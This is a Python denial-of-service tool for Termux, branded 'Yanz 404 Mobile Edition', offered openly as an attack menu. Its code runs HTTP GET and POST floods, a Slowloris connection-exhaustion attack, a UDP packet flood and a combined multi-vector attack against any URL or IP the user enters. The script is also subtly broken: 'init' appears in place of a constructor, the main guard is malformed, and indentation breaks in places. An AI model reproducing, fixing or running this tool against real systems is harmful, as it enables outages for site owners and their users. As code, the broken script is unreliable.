#!/data/data/com.termux/files/usr/bin/python3
import os
import sys
import time
import random
import threading
import socket
import requests
from concurrent.futures import ThreadPoolExecutor

# Banner Yanz 404 Mobile
def show_banner():
    print("""
    \033[91m
    ██╗   ██╗ █████╗ ███╗   ██╗███████╗    ██████╗ ██████╗ ██╗
    ╚██╗ ██╔╝██╔══██╗████╗  ██║╚══███╔╝   ██╔════╝██╔════╝ ██║
     ╚████╔╝ ███████║██╔██╗ ██║  ███╔╝    ██║     ██║  ███╗██║
      ╚██╔╝  ██╔══██║██║╚██╗██║ ███╔╝     ██║     ██║   ██║╚═╝
       ██║   ██║  ██║██║ ╚████║███████╗██╗╚██████╗╚██████╔╝██╗
       ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝ ╚═════╝ ╚═════╝ ╚═╝
    \033[0m
    \033[93mYanz 404 Mobile Edition - Termux Optimized\033[0m
    """)

class YanzMobile:
    def init(self):
        self.user_agents = [
            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36',
            'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36',
            'Mozilla/5.0 (Linux; Android 12; SM-S908E) AppleWebKit/537.36',
            'Mozilla/5.0 (Linux; Android 13; 2201116SG) AppleWebKit/537.36',
            'Mozilla/5.0 (Linux; Android 9; Redmi Note 8) AppleWebKit/537.36'
        ]
        self.attack_running = False
        
    def http_get_flood(self, target, duration=60, threads=50):
        """HTTP GET Flood yang dioptimalkan untuk mobile"""
        print(f"[YANZ404] Starting HTTP GET Flood: {target}")
        end_time = time.time() + duration
        
        def attack():
            session = requests.Session()
            while time.time() < end_time and self.attack_running:
                try:
                    headers = {
                        'User-Agent': random.choice(self.user_agents),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive',
                        'Cache-Control': 'no-cache'
                    }
                    # Tambah random parameter untuk avoid cache
                    url = f"{target}?rand={random.randint(1000,9999)}&cache={time.time()}"
                    session.get(url, headers=headers, timeout=5)
                except:
                    pass
        
        # Gunakan ThreadPoolExecutor untuk resource management yang better
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(attack) for _ in range(threads)]
            time.sleep(duration)
    
    def post_flood(self, target, duration=60, threads=30):
        """HTTP POST Flood dengan random data"""
        print(f"[YANZ404] Starting POST Flood: {target}")
        end_time = time.time() + duration
        
        def attack():
            session = requests.Session()
            while time.time() < end_time and self.attack_running:
                try:
                    headers = {
                        'User-Agent': random.choice(self.user_agents),
                        'Content-Type': 'application/json',
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                    
                    # Random JSON data
                    payload = {
                        'username': f"user{random.randint(1000,9999)}",
                        'password': f"pass{random.randint(10000,99999)}",
                        'email': f"test{random.randint(1000,9999)}@gmail.com",
                        'timestamp': int(time.time())
                    }
                    
                    session.post(target, json=payload, headers=headers, timeout=5)
                except:
                    pass
        
        with ThreadPoolExecutor(max_workers=threads) as executor:

futures = [executor.submit(attack) for _ in range(threads)]
            time.sleep(duration)
    
    def slowloris_mobile(self, target, duration=120, sockets=100):
        """Slowloris attack yang dioptimalkan untuk resource terbatas"""
        print(f"[YANZ404] Starting Slowloris: {target}")
        
        # Parse target
        if "://" in target:
            target = target.split("://")[1]
        host = target.split("/")[0]
        path = "/" + "/".join(target.split("/")[1:]) if "/" in target else "/"
        
        socket_list = []
        end_time = time.time() + duration
        
        try:
            # Create partial connections
            for i in range(sockets):
                if not self.attack_running:
                    break
                    
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((host, 80))
                    
                    # Send partial request
                    s.send(f"GET {path} HTTP/1.1\r\n".encode())
                    s.send(f"Host: {host}\r\n".encode())
                    s.send("User-Agent: {}\r\n".format(random.choice(self.user_agents)).encode())
                    socket_list.append(s)
                except socket.error:
                    break
                
                time.sleep(0.1)  # Avoid overwhelming the device
            
            # Maintain connections
            while time.time() < end_time and self.attack_running and socket_list:
                for s in socket_list:
                    try:
                        s.send(f"X-{random.randint(1000,9999)}: {random.randint(1000,9999)}\r\n".encode())
                    except socket.error:
                        socket_list.remove(s)
                        # Try to create new connection
                        try:
                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            new_s.settimeout(4)
                            new_s.connect((host, 80))
                            new_s.send(f"GET {path} HTTP/1.1\r\n".encode())
                            new_s.send(f"Host: {host}\r\n".encode())
                            socket_list.append(new_s)
                        except:
                            pass
                
                time.sleep(15)  # Keep-alive interval
                
        finally:
            # Cleanup
            for s in socket_list:
                try:
                    s.close()
                except:
                    pass
    
    def udp_flood(self, target_ip, target_port=80, duration=60, packet_size=1024):
        """UDP Flood attack"""
        print(f"[YANZ404] Starting UDP Flood: {target_ip}:{target_port}")
        end_time = time.time() + duration
        
        def flood():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Generate random payload
            payload = random._urandom(packet_size)
            
            while time.time() < end_time and self.attack_running:
                try:
                    sock.sendto(payload, (target_ip, target_port))
                except:
                    pass
            sock.close()
        
        threads = []
        for _ in range(10):  # 10 threads untuk UDP flood
            t = threading.Thread(target=flood)
            t.daemon = True
            t.start()
            threads.append(t)
        
        time.sleep(duration)
    
    def multi_vector_attack(self, target, duration=180):
        """Multi-vector coordinated attack"""
        print(f"[YANZ404] Starting Multi-Vector Attack: {target}")
        self.attack_running = True
        
        # Jalankan berbagai attack vectors secara bersamaan

threads = []
        
        # HTTP GET Flood
        t1 = threading.Thread(target=self.http_get_flood, args=(target, duration, 40))
        t1.daemon = True
        t1.start()
        threads.append(t1)
        
        # POST Flood  
        t2 = threading.Thread(target=self.post_flood, args=(target, duration, 20))
        t2.daemon = True
        t2.start()
        threads.append(t2)
        
        # Slowloris
        t3 = threading.Thread(target=self.slowloris_mobile, args=(target, duration, 80))
        t3.daemon = True
        t3.start()
        threads.append(t3)
        
        # Tunggu sampai selesai
        time.sleep(duration)
        self.attack_running = False
        
        print(f"[YANZ404] Multi-vector attack completed")
    
    def stop_attacks(self):
        """Stop semua attacks"""
        self.attack_running = False
        print("[YANZ404] All attacks stopped")

def main():
    show_banner()
    yanz = YanzMobile()
    
    while True:
        print("\n\033[92mYanz 404 Mobile Edition - Attack Menu\033[0m")
        print("1. HTTP GET Flood")
        print("2. HTTP POST Flood") 
        print("3. Slowloris Attack")
        print("4. UDP Flood")
        print("5. Multi-Vector Attack")
        print("6. Stop All Attacks")
        print("7. Exit")
        
        choice = input("\nSelect attack [1-7]: ").strip()
        
        if choice == '1':
            target = input("Enter target URL: ").strip()
            duration = int(input("Duration (seconds): ") or "60")
            threads = int(input("Threads [50]: ") or "50")
            yanz.http_get_flood(target, duration, threads)
            
        elif choice == '2':
            target = input("Enter target URL: ").strip()
            duration = int(input("Duration (seconds): ") or "60")
            yanz.post_flood(target, duration)
            
        elif choice == '3':
            target = input("Enter target URL: ").strip()
            duration = int(input("Duration [120]: ") or "120")
            yanz.slowloris_mobile(target, duration)
            
        elif choice == '4':
            target = input("Enter target IP: ").strip()
            port = int(input("Port [80]: ") or "80")
            duration = int(input("Duration [60]: ") or "60")
            yanz.udp_flood(target, port, duration)
            
        elif choice == '5':
            target = input("Enter target URL: ").strip()
            duration = int(input("Duration [180]: ") or "180")
            yanz.multi_vector_attack(target, duration)
            
        elif choice == '6':
            yanz.stop_attacks()
            
        elif choice == '7':
            yanz.stop_attacks()
            print("[YANZ404] Exiting...")
            break
            
        else:
            print("Invalid choice!")

if name == "main":
    main()
